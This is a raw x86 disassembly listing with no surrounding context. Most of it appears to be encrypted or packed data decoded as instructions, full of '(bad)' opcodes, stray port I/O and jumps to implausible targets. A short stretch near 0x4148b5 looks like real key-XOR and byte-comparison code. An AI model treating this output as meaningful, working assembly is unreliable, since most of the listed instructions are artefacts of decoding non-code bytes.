  4144e0:	repz popf 
  4144e2:	sub    al,0x94
  4144e4:	sub    dl,dh
  4144e6:	repnz dec edx
  4144e8:	add    esp,DWORD PTR [edi+0x20]
  4144eb:	adc    BYTE PTR [esi],bl
  4144ed:	mov    DWORD PTR fs:[edi],ecx
  4144f0:	inc    esp
  4144f1:	stc    
  4144f2:	shl    BYTE PTR ds:0xff6f9c,1
  4144f8:	shl    DWORD PTR [ebp-0x75],cl
  4144fb:	jno    0x4144d4
  4144fd:	out    0x3a,eax
  4144ff:	ss jmp 0x4144ce
  414502:	pop    edx
  414503:	adc    edi,esi
  414505:	and    esp,eax
  414507:	fs xor eax,0x9e2696b0
  41450d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41450e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41450f:	cmp    DWORD PTR [ecx],0x1c
  414512:	stos   BYTE PTR es:[edi],al
  414513:	ror    DWORD PTR ds:0xcdb8e081,0x79
  41451a:	fist   DWORD PTR [edx-0x4a]
  41451d:	cmp    bh,bh
  41451f:	jb     0x414571
  414521:	push   ecx
  414522:	(bad)  [ecx+0x36]
  414525:	pop    edx
  414526:	outs   dx,BYTE PTR ds:[esi]
  414527:	sti    
  414528:	js     0x4144be
  41452a:	ret    
  41452b:	xchg   ebx,eax
  41452c:	and    al,0x57
  41452e:	mov    eax,0x69b59afb
  414534:	aam    0x9b
  414536:	repnz pushf 
  414538:	in     al,dx
  414539:	push   ecx
  41453a:	adc    DWORD PTR [esp+edi*8-0x7c97f9e6],0xf0419866
  414545:	inc    edx
  414546:	mov    dh,0xb
  414548:	inc    eax
  414549:	mov    eax,ds:0xeecf800a
  41454e:	add    dl,BYTE PTR [edi+0x1906fef9]
  414554:	mov    ch,0xd8
  414556:	out    0xd9,al
  414558:	ficomp DWORD PTR [esi+0x4a644806]
  41455e:	xlat   BYTE PTR ds:[ebx]
  41455f:	dec    edi
  414560:	xor    edx,esp
  414562:	stc    
  414563:	push   esi
  414564:	push   0x46cb2f83
  414569:	arpl   WORD PTR fs:[esi],bp
  41456c:	push   edi
  41456d:	js     0x41455a
  41456f:	add    dh,bl
  414571:	popa   
  414572:	mov    esi,0xfe6fb4c1
  414577:	pushf  
  414578:	mov    DWORD PTR ds:[eax-0x3bc7aa9d],ebp
  41457f:	outs   dx,BYTE PTR ds:[esi]
  414580:	and    esi,DWORD PTR [ebx+0x6]
  414583:	fcmovne st,st(3)
  414585:	cmp    ecx,esi
  414587:	out    0xe3,al
  414589:	repz or BYTE PTR es:[edi],0x69
  41458e:	imul   esp,DWORD PTR [esi],0x5f
  414591:	aad    0x5
  414593:	pop    ebx
  414594:	sbb    esp,0xffffffc2
  414597:	jg     0x41457c
  414599:	jne    0x4145b2
  41459b:	pop    es
  41459c:	rcl    BYTE PTR [edx],1
  41459e:	outs   dx,BYTE PTR ds:[esi]
  41459f:	mov    edi,0x9e323ac5
  4145a4:	ja     0x4145cd
  4145a6:	pop    esp
  4145a7:	pop    ss
  4145a8:	arpl   WORD PTR [edx+ebx*8+0x10],bp
  4145ac:	sbb    BYTE PTR [ebp-0x6c],bl
  4145af:	fst    QWORD PTR ds:0x8450d5a2
  4145b5:	scas   al,BYTE PTR es:[edi]
  4145b6:	jecxz  0x41453e
  4145b8:	xchg   edx,eax
  4145b9:	mov    ch,0xe8
  4145bb:	fldcw  WORD PTR [edx-0x4a24d4f6]
  4145c1:	into   
  4145c2:	dec    eax
  4145c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c4:	sub    esp,ebx
  4145c6:	lods   al,BYTE PTR ds:[esi]
  4145c7:	pushf  
  4145c8:	repz clc 
  4145ca:	ret    
  4145cb:	push   ss
  4145cc:	sub    eax,0x128ea523
  4145d1:	adc    DWORD PTR [esi+0x19],edi
  4145d4:	gs mov bl,0xb1
  4145d7:	lds    ecx,FWORD PTR [edi+ebx*8]
  4145da:	retf   
  4145db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145dc:	enter  0xe355,0x84
  4145e0:	in     al,0xbf
  4145e2:	xchg   ecx,eax
  4145e3:	sahf   
  4145e4:	add    al,BYTE PTR [edi]
  4145e6:	stc    
  4145e7:	in     al,dx
  4145e8:	repz push 0x4f
  4145eb:	jl     0x41464a
  4145ed:	dec    ecx
  4145ee:	xor    eax,0xc560f548
  4145f3:	(bad)  
  4145f4:	cmp    ebp,esi
  4145f6:	out    0x1c,eax
  4145f8:	push   ecx
  4145f9:	std    
  4145fa:	das    
  4145fb:	jle    0x41465a
  4145fd:	in     eax,0x6e
  4145ff:	mov    eax,0xd343bbc3
  414604:	pop    ebx
  414605:	xchg   ebp,eax
  414606:	mov    fs,WORD PTR [edx-0x79b0a395]
  41460c:	pop    ds
  41460d:	mov    ds:0xa283fa65,eax
  414612:	out    dx,eax
  414613:	loopne 0x4145a2
  414615:	ror    DWORD PTR [ebp-0x8],1
  414618:	stc    
  414619:	xor    DWORD PTR [ecx],0xc
  41461c:	jle    0x41462c
  41461e:	in     al,dx
  41461f:	in     eax,0xd9
  414621:	lods   al,BYTE PTR ds:[esi]
  414622:	pushf  
  414623:	pop    ds
  414624:	lock inc ecx
  414626:	mov    eax,0x8746a96
  41462b:	pop    esi
  41462c:	mov    ch,BYTE PTR [ebp+0x27]
  41462f:	lods   eax,DWORD PTR ds:[esi]
  414630:	cwde   
  414631:	clc    
  414632:	mov    BYTE PTR [eax],bh
  414634:	inc    ecx
  414635:	loop   0x4146a7
  414637:	xor    eax,ebx
  414639:	pop    ebp
  41463a:	fst    DWORD PTR [eax+0x7]
  41463d:	pushf  
  41463e:	outs   dx,BYTE PTR ds:[esi]
  41463f:	pusha  
  414640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414641:	cmp    DWORD PTR [ebx+0xccb85ba],eax
  414647:	rcl    BYTE PTR [eax-0x3f1208ea],1
  41464d:	lds    ebp,FWORD PTR [eax+ebp*8+0x6b]
  414651:	pop    ss
  414652:	xlat   BYTE PTR ds:[ebx]
  414653:	(bad)  
  414654:	out    0xf7,al
  414656:	or     DWORD PTR [esi+0x2dfd210d],esp
  41465c:	cdq    
  41465d:	push   0xffffff91
  41465f:	popa   
  414660:	inc    edi
  414661:	pusha  
  414662:	cmp    eax,0x712ae1b2
  414667:	test   BYTE PTR [edi],bl
  414669:	jmp    DWORD PTR [edi+0x62]
  41466c:	mov    bh,BYTE PTR [ebx+0xf498cb9]
  414672:	repnz rcl DWORD PTR [edx+0x1f],1
  414676:	imul   eax,DWORD PTR ds:[ebp+0x53379f4d],0x10a5f475
  414681:	ficom  DWORD PTR [ecx]
  414683:	push   ss
  414684:	sub    BYTE PTR [edi+0x47],dh
  414687:	mov    cl,0xce
  414689:	call   0xaec44b39
  41468e:	aam    0x1a
  414690:	and    eax,0xecee63ca
  414695:	sti    
  414696:	mov    edx,0x37631b61
  41469b:	pop    ebp
  41469c:	aad    0x9d
  41469e:	lds    esp,FWORD PTR [ebx]
  4146a0:	pop    ss
  4146a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a2:	mov    WORD PTR [eax],ds
  4146a4:	inc    eax
  4146a5:	jecxz  0x4146f9
  4146a7:	fadd   DWORD PTR [esi-0x32]
  4146aa:	mov    ah,0xe4
  4146ac:	aam    0x55
  4146ae:	mov    esi,0xc4d8bcd9
  4146b3:	adc    al,0xf0
  4146b5:	outs   dx,BYTE PTR ds:[esi]
  4146b6:	dec    edx
  4146b7:	lods   al,BYTE PTR ds:[esi]
  4146b8:	fsubr  QWORD PTR [edi+0x1e]
  4146bb:	mov    dh,0x5
  4146bd:	rcr    BYTE PTR [ecx-0x9b9de18],1
  4146c3:	sub    dl,BYTE PTR ds:0xffda56f2
  4146c9:	test   al,0x81
  4146cb:	mov    ds:0xb05d81bb,al
  4146d0:	test   DWORD PTR [eax-0x3b],esi
  4146d3:	ror    al,cl
  4146d5:	in     al,dx
  4146d6:	jae    0x41468e
  4146d8:	shl    edi,cl
  4146da:	jbe    0x4146a4
  4146dc:	push   es
  4146dd:	cmp    DWORD PTR [ecx],edx
  4146df:	pop    es
  4146e0:	pop    ds
  4146e1:	lods   eax,DWORD PTR ds:[esi]
  4146e2:	stos   BYTE PTR es:[edi],al
  4146e3:	push   esi
  4146e4:	int3   
  4146e5:	add    bl,dl
  4146e7:	mov    cl,0xc9
  4146e9:	push   cs
  4146ea:	iret   
  4146eb:	sti    
  4146ec:	imul   eax,DWORD PTR [edi+0x59],0xb255a0e1
  4146f3:	cmp    BYTE PTR ds:0xe0aa8def,cl
  4146f9:	pop    edi
  4146fa:	inc    esi
  4146fb:	inc    ecx
  4146fc:	retf   
  4146fd:	sub    BYTE PTR [edi-0x5391e55f],bl
  414703:	sbb    al,0xab
  414705:	das    
  414706:	or     ebx,ebp
  414708:	imul   esi,DWORD PTR [edx+0x4e4c5d44],0x2c29f422
  414712:	loop   0x41471a
  414714:	pop    ebp
  414715:	jbe    0x414702
  414717:	shl    DWORD PTR ss:[eax-0x7adfdd6d],1
  41471e:	int3   
  41471f:	add    eax,0xc4933661
  414724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414725:	xlat   BYTE PTR gs:[ebx]
  414727:	xor    BYTE PTR ds:0xd911514c,dh
  41472d:	dec    eax
  41472e:	dec    eax
  41472f:	lea    edi,[ecx+0xc14e0bb]
  414735:	adc    BYTE PTR [ebp-0x121c0a4d],ah
  41473b:	jno    0x414714
  41473d:	xchg   esp,eax
  41473e:	xor    BYTE PTR ds:0xf6f07aac,dh
  414744:	mov    ecx,DWORD PTR [edi-0x36]
  414747:	sti    
  414748:	popa   
  414749:	push   eax
  41474a:	push   ecx
  41474b:	fidivr WORD PTR [ebp-0x58b7e2b4]
  414751:	bound  edx,QWORD PTR [ecx+0x7064734e]
  414757:	shl    BYTE PTR [ecx+0x5dd6e2d6],1
  41475d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41475e:	rol    dl,1
  414760:	(bad)  
  414761:	cmp    ebp,ecx
  414763:	ins    DWORD PTR es:[edi],dx
  414764:	sub    DWORD PTR [edx],ebx
  414766:	addr16 sbb edi,ecx
  414769:	jmp    0x4383dd9
  41476e:	jl     0x4147e5
  414770:	or     ecx,DWORD PTR [esp+esi*4]
  414773:	shl    dh,cl
  414775:	fadd   DWORD PTR [eax+0x14]
  414778:	fwait
  414779:	daa    
  41477a:	retf   0x71d1
  41477d:	(bad)  
  41477e:	ja     0x414794
  414780:	scas   al,BYTE PTR es:[edi]
  414781:	ret    
  414782:	mov    esp,0x9be10720
  414787:	push   edi
  414788:	and    al,0x85
  41478a:	mov    eax,ds:0xa4875493
  41478f:	rcl    cl,0xed
  414792:	pop    esp
  414793:	mov    ss,WORD PTR [edi]
  414795:	shr    DWORD PTR [ebx+0x8e71fc9],cl
  41479b:	inc    esi
  41479c:	mov    edi,0xbdded5db
  4147a1:	cli    
  4147a2:	pop    edi
  4147a3:	jbe    0x4147fb
  4147a5:	xchg   ebx,eax
  4147a6:	rcr    BYTE PTR [ecx-0x46],1
  4147a9:	inc    edx
  4147aa:	mov    bl,0x7f
  4147ac:	and    DWORD PTR [ebx+0x31e1fcf],ebx
  4147b2:	fdivrp st(0),st
  4147b4:	sbb    esp,DWORD PTR [edi+ebx*1-0x15]
  4147b8:	or     eax,0x747cb509
  4147bd:	test   eax,0x7d565ea5
  4147c2:	xor    BYTE PTR [edx],cl
  4147c4:	mov    esi,0x2c321b04
  4147c9:	dec    ebx
  4147ca:	jnp    0x4147af
  4147cc:	cmp    eax,DWORD PTR [edx-0x268793a2]
  4147d2:	jnp    0x4147ac
  4147d4:	jbe    0x41482b
  4147d6:	or     eax,0x9a744c0c
  4147db:	sub    ch,BYTE PTR es:[ecx+esi*1+0x5]
  4147e0:	dec    ebp
  4147e1:	mov    ebx,0x3b04b9f1
  4147e6:	gs and edx,eax
  4147e9:	sahf   
  4147ea:	test   al,0x2d
  4147ec:	cmp    DWORD PTR [ecx+0x4dcc419e],esi
  4147f2:	xchg   ebx,eax
  4147f3:	add    al,0x45
  4147f5:	sbb    dl,ah
  4147f7:	jl     0x414831
  4147f9:	xor    ch,al
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	pop    ds
  4147fd:	mov    ebx,?
  4147ff:	popf   
  414800:	sbb    BYTE PTR [eax+0x57bda04d],cl
  414806:	aas    
  414807:	xlat   BYTE PTR ds:[ebx]
  414808:	mov    ecx,0x7c0b9427
  41480d:	shr    esi,0x7e
  414810:	ficomp DWORD PTR [ecx]
  414812:	sbb    eax,0x2c881ffa
  414817:	mov    ebx,0xc2572649
  41481c:	sar    bl,cl
  41481e:	pop    eax
  41481f:	adc    al,0x4e
  414821:	inc    eax
  414822:	xor    al,0x1f
  414824:	or     DWORD PTR [ebp-0x629d7b8e],ebp
  41482a:	fcomp  QWORD PTR [esi+edx*1]
  41482d:	mov    fs,ebp
  41482f:	xor    DWORD PTR [eax+eax*1],eax
  414832:	mul    DWORD PTR [edx+0x4c]
  414835:	or     DWORD PTR [esi+0x5f],edi
  414838:	push   ss
  414839:	push   DWORD PTR [edi+0xca884dd]
  41483f:	ret    0xdb8c
  414842:	sub    BYTE PTR [ebx],ch
  414844:	dec    esi
  414845:	dec    esp
  414846:	mov    edx,?
  414848:	sbb    al,0xf4
  41484a:	sub    esi,DWORD PTR [eax]
  41484c:	pop    DWORD PTR [edi-0x3c1587c2]
  414852:	in     al,dx
  414853:	lods   al,BYTE PTR ds:[esi]
  414854:	cli    
  414855:	ins    DWORD PTR es:[edi],dx
  414856:	jns    0x414877
  414858:	aas    
  414859:	retf   0x242f
  41485c:	lea    eax,[ebp+0x4c]
  41485f:	mov    eax,0x2d993cbf
  414864:	sbb    DWORD PTR [esi-0x589a62fb],edi
  41486a:	popf   
  41486b:	cmc    
  41486c:	dec    eax
  41486d:	xor    eax,0x375b9c54
  414872:	or     DWORD PTR [eax+0x10],ebp
  414875:	mov    esi,0x81c6570
  41487a:	cld    
  41487b:	idiv   DWORD PTR [ebx]
  41487d:	retf   
  41487e:	mov    eax,ds:0x80d39ee0
  414883:	lahf   
  414884:	das    
  414885:	es jns 0x414885
  414888:	ror    DWORD PTR [edx+0x3a65ffeb],cl
  41488e:	and    eax,0x48d98edd
  414893:	cmp    BYTE PTR [ebp+0x72],0xdc
  414897:	imul   edx,DWORD PTR [edx-0x7c5ab17e],0x3c885887
  4148a1:	jl     0x414901
  4148a3:	add    bl,dh
  4148a5:	xor    ebx,DWORD PTR [edx-0x3c]
  4148a8:	test   al,0x15
  4148aa:	cld    
  4148ab:	push   esp
  4148ac:	iret   
  4148ad:	fldcw  WORD PTR [ebx+0x3c60ea9]
  4148b3:	xor    ah,ch
  4148b5:	mov    edx,DWORD PTR [ebp+0x8]
  4148b8:	xor    edx,eax
  4148ba:	add    edx,esi
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0xfb1fac4e
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx-0x656bed1],0x39
  414952:	push   0x5479f1d0
  414957:	add    ebp,ebx
  414959:	push   es
  41495a:	xchg   ecx,eax
  41495b:	jns    0x41499e
  41495d:	mov    edx,0xbcf4f79f
  414962:	pushw  es
  414964:	or     DWORD PTR [ebp+eiz*4+0x1a],0xffffffad
  414969:	jge    0x4149b8
  41496b:	dec    esi
  41496c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41496d:	test   DWORD PTR [ecx+0x39],ebp
  414970:	in     al,0xb8
  414972:	(bad)  
  414973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414974:	(bad)
  414978:	sbb    ah,al
  41497a:	cmp    BYTE PTR [edi-0x60],0x62
  41497e:	test   eax,0x97f762
  414983:	pop    es
  414984:	mov    ebp,0x82a7c218
  414989:	mov    eax,0xd86873ce
  41498e:	jb     0x4149e9
  414990:	call   0x7b52:0xad9c3f45
  414997:	push   ecx
  414998:	sahf   
  414999:	lds    eax,FWORD PTR [esi]
  41499b:	xchg   edi,eax
  41499c:	inc    esi
  41499d:	jo     0x414937
  41499f:	xchg   BYTE PTR [eax],cl
  4149a1:	test   eax,0xd0753dfd
  4149a6:	scas   al,BYTE PTR es:[edi]
  4149a7:	sub    BYTE PTR [ebx-0x3d085942],al
  4149ad:	cwde   
  4149ae:	imul   edi,DWORD PTR [eax-0x35],0x5c05845e
  4149b5:	test   al,0xb7
  4149b7:	in     eax,dx
  4149b8:	fwait
  4149b9:	mov    edi,0xa29b44e2
  4149be:	out    0xbe,al
  4149c0:	fld    DWORD PTR [eax]
  4149c2:	aas    
  4149c3:	push   edi
  4149c4:	jle    0x414992
  4149c6:	ror    DWORD PTR [ebp-0x7d40523],cl
  4149cc:	pop    edx
  4149cd:	and    al,BYTE PTR [ebx]
  4149cf:	jmp    0x7cb7f828
  4149d4:	mov    ah,0xcf
  4149d6:	lods   al,BYTE PTR ds:[esi]
  4149d7:	outs   dx,BYTE PTR ds:[esi]
  4149d8:	pop    es
  4149d9:	and    esp,DWORD PTR [ebx-0x7fc3e48c]
  4149df:	xchg   edi,eax
  4149e0:	lods   eax,DWORD PTR ds:[esi]
  4149e1:	inc    ebx
  4149e2:	cmp    ebp,DWORD PTR [edx+0x40]
  4149e5:	pop    edi
  4149e6:	sbb    dh,BYTE PTR [ebp-0x73717d15]
  4149ec:	popa   
  4149ed:	jb     0x414982
  4149ef:	xlat   BYTE PTR ds:[ebx]
  4149f0:	jle    0x4149a2
  4149f2:	jecxz  0x4149b4
  4149f4:	loopne 0x4149f6
  4149f6:	icebp  
  4149f7:	push   edi
  4149f8:	xlat   BYTE PTR ds:[ebx]
  4149f9:	repz shl BYTE PTR [edi-0x2cb23693],cl
  414a00:	mov    ch,BYTE PTR [edi-0x76564c7d]
  414a06:	or     eax,0x44db508a
  414a0b:	mov    ah,0xc
  414a0d:	mov    dl,0x12
  414a0f:	pop    edx
  414a10:	jne    0x414a52
  414a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a13:	push   edx
  414a14:	jmp    DWORD PTR [ebx-0x59]
  414a17:	ja     0x414a5f
  414a19:	iret   
  414a1a:	mov    eax,0xe73e8486
  414a1f:	repnz mov es,eax
  414a22:	in     eax,dx
  414a23:	inc    esp
  414a24:	aaa    
  414a25:	inc    ebp
  414a26:	leave  
  414a27:	pop    eax
  414a28:	icebp  
  414a29:	sar    bh,0xbd
  414a2c:	pop    esi
  414a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a2e:	arpl   WORD PTR [ecx],ax
  414a30:	jmp    0x414a15
  414a32:	je     0x414a19
  414a34:	outs   dx,BYTE PTR ds:[esi]
  414a35:	mov    esi,DWORD PTR [edi]
  414a37:	sub    bl,BYTE PTR [esi+0x7d]
  414a3a:	jg     0x4149fa
  414a3c:	icebp  
  414a3d:	loope  0x414a43
  414a3f:	(bad)  
  414a40:	sbb    BYTE PTR [ecx+0x7997046a],ah
  414a46:	scas   eax,DWORD PTR es:[edi]
  414a47:	and    BYTE PTR [esi],ah
  414a49:	fnstenv [eax+edi*8+0x49387142]
  414a50:	xchg   esi,eax
  414a51:	cdq    
  414a52:	xor    DWORD PTR [ecx+0x294f6c10],edx
  414a58:	adc    eax,0xbdd5f899
  414a5d:	pop    edi
  414a5e:	fcmovb st,st(6)
  414a60:	sub    BYTE PTR [edx],0xa6
  414a63:	(bad)  
  414a65:	shr    DWORD PTR [bx+di+0x43],cl
  414a69:	cli    
  414a6a:	popa   
  414a6b:	xchg   ebp,eax
  414a6c:	adc    eax,0x6927b0ef
  414a71:	dec    ebx
  414a72:	dec    esp
  414a73:	out    0x58,al
  414a75:	xchg   esp,eax
  414a76:	push   ss
  414a77:	repnz and eax,0x40ca91a9
  414a7d:	cmp    bl,ah
  414a7f:	add    al,0xc3
  414a81:	pushf  
  414a82:	push   cs
  414a83:	push   ecx
  414a84:	(bad)  
  414a85:	out    dx,eax
  414a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a87:	clc    
  414a88:	outs   dx,DWORD PTR ds:[esi]
  414a89:	and    edi,DWORD PTR [eax-0x4f]
  414a8c:	mov    esi,0x8addde42
  414a91:	xchg   ecx,eax
  414a92:	push   edx
  414a93:	arpl   WORD PTR [edx+0xe5ff93f],si
  414a99:	jbe    0x414aaa
  414a9b:	jnp    0x414a65
  414a9d:	cmp    al,0xae
  414a9f:	gs arpl WORD PTR ds:[edx-0x11],cx
  414aa4:	lock daa 
  414aa6:	inc    esp
  414aa7:	ss popa 
  414aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aaa:	aad    0x4a
  414aac:	adc    al,BYTE PTR [ecx+0x42]
  414aaf:	nop
  414ab0:	push   0x23
  414ab2:	ja     0x414a83
  414ab4:	adc    al,0x14
  414ab6:	jp     0x414a8a
  414ab8:	bnd jae 0x414b28
  414abb:	mov    edx,0x5ec11c0b
  414ac0:	shr    DWORD PTR [esi+0x13e6220a],0xa1
  414ac7:	xchg   BYTE PTR [edx+0x8],bh
  414aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414acb:	das    
  414acc:	push   0xffffffcf
  414ace:	jp     0x414a53
  414ad0:	(bad)  
  414ad1:	adc    BYTE PTR [eax],ch
  414ad3:	mov    ebx,0xe9a0befc
  414ad8:	fwait
  414ad9:	xchg   BYTE PTR [esi-0x558ca303],dl
  414adf:	push   ebp
  414ae0:	test   DWORD PTR [ecx+0x406e6e9b],edi
  414ae6:	and    ah,cl
  414ae8:	std    
  414ae9:	pop    edx
  414aea:	adc    esp,esi
  414aec:	cli    
  414aed:	push   esp
  414aee:	ror    DWORD PTR [eax+0x49],1
  414af1:	adc    BYTE PTR [ecx],dh
  414af3:	dec    ecx
  414af4:	inc    esp
  414af5:	mov    ds:0xd4e366c7,al
  414afa:	shl    edi,1
  414afc:	test   BYTE PTR [ebx+0xd57d131],dh
  414b02:	or     al,0xcf
  414b04:	xchg   ebx,eax
  414b05:	dec    ecx
  414b06:	push   ecx
  414b07:	inc    esi
  414b08:	push   ebp
  414b0a:	call   0x3135:0x88c1df79
  414b11:	sti    
  414b12:	jmp    DWORD PTR [eax+0x59]
  414b15:	leave  
  414b16:	xor    DWORD PTR [esi],esi
  414b18:	cmp    DWORD PTR [edx],edx
  414b1a:	sbb    BYTE PTR [eax],ah
  414b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b1d:	dec    ebx
  414b1e:	lds    ecx,FWORD PTR [ebx]
  414b20:	(bad)  
  414b22:	and    bh,BYTE PTR [edi-0x16]
  414b25:	add    DWORD PTR [ebx],ecx
  414b27:	aaa    
  414b28:	fwait
  414b29:	pop    ss
  414b2a:	mov    dh,0x1e
  414b2c:	mov    dh,0x55
  414b2e:	mov    ebp,0x2b904023
  414b33:	mov    ds:0xd99a837a,eax
  414b38:	dec    BYTE PTR [edx+0x75]
  414b3b:	gs jmp 0x1bdd:0x2d8af306
  414b43:	sbb    DWORD PTR [ebx],ebx
  414b45:	cs inc edx
  414b47:	mov    ds:0xc4ae0a70,al
  414b4c:	xchg   BYTE PTR [edx-0x276a6eb8],ah
  414b52:	pop    esi
  414b53:	iret   
  414b54:	dec    esi
  414b55:	mov    ds:0x1ea828f9,eax
  414b5a:	mov    esi,0x86d9335b
  414b5f:	cmp    BYTE PTR [esi+0x0],bh
  414b62:	inc    edx
  414b63:	fadd   DWORD PTR ds:0x1ca50064
  414b69:	push   ebp
  414b6a:	adc    DWORD PTR [ecx-0x4f],esi
  414b6d:	daa    
  414b6e:	je     0x414bdc
  414b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b71:	js     0x414b1f
  414b73:	add    eax,0x6bc45830
  414b78:	sub    dh,cl
  414b7a:	sub    BYTE PTR [edi],ch
  414b7c:	stos   BYTE PTR es:[edi],al
  414b7d:	add    al,0x7d
  414b7f:	ins    BYTE PTR es:[edi],dx
  414b80:	sub    dl,ch
  414b82:	rcl    DWORD PTR [esi],cl
  414b84:	pop    ecx
  414b85:	jns    0x414b93
  414b87:	add    esp,DWORD PTR [ebx]
  414b89:	test   BYTE PTR [edx-0x4fe07e77],al
  414b8f:	mov    ds:0x5104f958,eax
  414b94:	mov    esi,0x7333a2e
  414b99:	shl    ah,0xe9
  414b9c:	int    0x4d
  414b9e:	jp     0x414baf
  414ba0:	lods   al,BYTE PTR ds:[esi]
  414ba1:	outs   dx,DWORD PTR ds:[esi]
  414ba2:	fisttp DWORD PTR [eax]
  414ba4:	mov    ds:0x1362e168,al
  414ba9:	xor    al,0x63
  414bab:	pop    ebp
  414bac:	or     ah,dl
  414bae:	add    dl,bl
  414bb0:	add    BYTE PTR [ecx+0x24740ad9],dh
  414bb6:	repnz mul BYTE PTR [esi-0x470f5024]
  414bbd:	jecxz  0x414c3c
  414bbf:	pop    ecx
  414bc0:	push   ebp
  414bc1:	and    al,dl
  414bc3:	loope  0x414bb5
  414bc5:	fidivr WORD PTR [edx+0x16]
  414bc8:	xchg   ebp,eax
  414bc9:	inc    ebx
  414bca:	js     0x414bdd
  414bcc:	cmp    edx,ecx
  414bce:	out    dx,eax
  414bcf:	push   ecx
  414bd0:	push   esp
  414bd1:	xchg   ebx,eax
  414bd2:	xor    BYTE PTR [esi-0x2a2b9f4d],dl
  414bd8:	jnp    0x414b5e
  414bda:	and    BYTE PTR [edx+ebx*4-0x5cb3f724],0x27
  414be2:	jbe    0x414c36
  414be4:	or     DWORD PTR [eax+ecx*2-0x66aad498],ebp
  414beb:	mul    BYTE PTR [ecx]
  414bed:	es push edi
  414bef:	lock push esi
  414bf1:	icebp  
  414bf2:	sbb    al,0xc0
  414bf4:	xchg   edi,eax
  414bf5:	or     DWORD PTR [ebx+0x3f],esp
  414bf8:	pop    esp
  414bf9:	repnz sbb dl,BYTE PTR [ebx+ebx*8+0x304ee1e9]
  414c01:	jnp    0x414c3c
  414c03:	outs   dx,BYTE PTR ds:[esi]
  414c04:	mov    eax,0xbfdf5f02
  414c09:	enter  0xcb71,0x84
  414c0d:	nop
  414c0e:	mov    al,ds:0x48baeee4
  414c13:	(bad)  
  414c15:	sub    eax,0xba6d6e3e
  414c1a:	stc    
  414c1b:	dec    ebx
  414c1c:	test   al,0x18
  414c1e:	sbb    eax,0xe1358beb
  414c23:	mov    al,ds:0xf03ce4aa
  414c28:	sub    al,0x45
  414c2a:	add    esp,eax
  414c2c:	mov    eax,0x2a28a93a
  414c31:	mov    ebx,0xd2872c89
  414c36:	xchg   ecx,eax
  414c37:	push   cs
  414c38:	xchg   DWORD PTR [ebp-0x58],ecx
  414c3b:	jmp    0xdbaa5fb2
  414c40:	pop    ebx
  414c41:	mov    ds:0x1d3a0c83,eax
  414c46:	ja     0x414c7d
  414c48:	cmp    DWORD PTR [esi],ebx
  414c4a:	mov    ah,0x4c
  414c4c:	push   ebp
  414c4d:	ud1    edx,DWORD PTR [eax+ebx*1+0x7d]
  414c52:	xor    ebp,DWORD PTR [edi]
  414c54:	(bad)  
  414c55:	xchg   esp,eax
  414c56:	add    DWORD PTR [eax-0x3a1158f7],0x3d
  414c5d:	add    esp,DWORD PTR [esi-0x6]
  414c60:	mul    BYTE PTR [eax]
  414c62:	adc    cl,BYTE PTR [edi-0x42]
  414c65:	push   edx
  414c66:	dec    ebx
  414c67:	dec    esi
  414c68:	aad    0x49
  414c6a:	jmp    0x77061c7
  414c6f:	sub    DWORD PTR [ebx-0x572ff54b],esi
  414c75:	adc    eax,0x8a386aaf
  414c7a:	ins    BYTE PTR es:[edi],dx
  414c7b:	mov    ecx,0x582115ce
  414c80:	(bad)  
  414c81:	aas    
  414c82:	add    al,0x26
  414c84:	out    0x3a,al
  414c86:	adc    ebx,DWORD PTR [eax+ecx*8-0x232fd799]
  414c8d:	leave  
  414c8e:	fimul  DWORD PTR [edx+0x2]
  414c91:	mov    DWORD PTR [eax],esi
  414c93:	adc    DWORD PTR [edx+0x1f],edi
  414c96:	or     eax,0x1cda7b27
  414c9b:	mul    BYTE PTR [edx+ebp*1]
  414c9e:	(bad)  
